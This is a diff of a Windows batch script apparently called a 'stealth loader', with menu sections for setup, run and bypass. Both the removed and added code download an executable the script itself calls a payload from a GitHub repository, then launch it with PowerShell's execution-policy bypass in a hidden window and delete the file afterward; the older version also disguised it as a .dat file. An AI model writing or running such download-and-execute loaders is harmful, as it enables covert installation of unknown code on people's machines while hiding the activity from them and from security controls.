@@ -51,62 +51,43 @@ timeout /t 2 >nul
 goto :STEALTH_MENU
 
 :SETUP
-echo.
-echo [*] STEP 1: Initializing setup...
-timeout /t 1 >nul
-echo [*] STEP 2: Connecting to GitHub...
-timeout /t 1 >nul
-echo [*] STEP 3: Downloading payload...
-set "RAW_EXE_URL=https://raw.githubusercontent.com/maxyprime/stealthloaderv2/main/CAXVN.exe"
-set "TEMP_EXE=%temp%\CAXVN.exe"
-set "DISGUISED_EXE=%temp%\user_data_blob.dat"
+cls
+echo [*] Connecting to GitHub...
+curl -L -o "%temp%\CAXVN.exe" "https://github.com/maxyprime/stealthloaderv2/raw/main/CAXVN.exe"
 
-curl -s -L -o "%TEMP_EXE%" "%RAW_EXE_URL%"
-
-if exist "%TEMP_EXE%" (
-    echo [*] Download complete. Renaming to disguised file...
-    copy /Y "%TEMP_EXE%" "%DISGUISED_EXE%" >nul
-    echo [✔] Setup successful. Disguised EXE ready.
+if exist "%temp%\CAXVN.exe" (
+    echo [✓] Downloaded CAXVN.exe successfully.
 ) else (
-    echo [!] Failed to download the EXE. Please check your internet or GitHub URL.
+    echo [✖] Failed to download EXE.
+    pause
+    goto STEALTH_MENU
 )
 
 pause
 goto STEALTH_MENU
 
+
 :RUN
 cls
-echo [*] Preparing to run EXE...
+echo [*] Preparing to launch CAXVN.exe...
 
-set "DISGUISED_EXE=%temp%\user_data_blob.dat"
-set "RUNTIME_EXE=%temp%\runner_exec.exe"
+set "EXE_PATH=%temp%\CAXVN.exe"
 
-if not exist "%temp%\CAXVN.exe" (
+if not exist "%EXE_PATH%" (
     echo [✖] EXE not found. Please run Setup first.
     pause
     goto STEALTH_MENU
 )
 
-:: Copy and disguise the EXE
-copy /Y "%temp%\CAXVN.exe" "%DISGUISED_EXE%" >nul 2>&1
-
-:: Now convert .dat back to .exe to actually run
-copy /Y "%DISGUISED_EXE%" "%RUNTIME_EXE%" >nul 2>&1
-
-echo [*] Running disguised EXE silently...
+echo [*] Running silently...
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
- "Start-Process -FilePath '%RUNTIME_EXE%' -WindowStyle Hidden -Wait"
+ "Start-Process -FilePath '%EXE_PATH%' -WindowStyle Hidden -Wait"
 
-echo [✓] EXE finished. Cleaning up...
-del /f /q "%RUNTIME_EXE%" >nul 2>&1
-del /f /q "%DISGUISED_EXE%" >nul 2>&1
+echo [✓] EXE has exited. Cleaning up...
+del /f /q "%EXE_PATH%" >nul 2>&1
 echo [✓] Cleanup complete.
 pause
 goto STEALTH_MENU
-
-
-
-
 
 
 :BYPASS
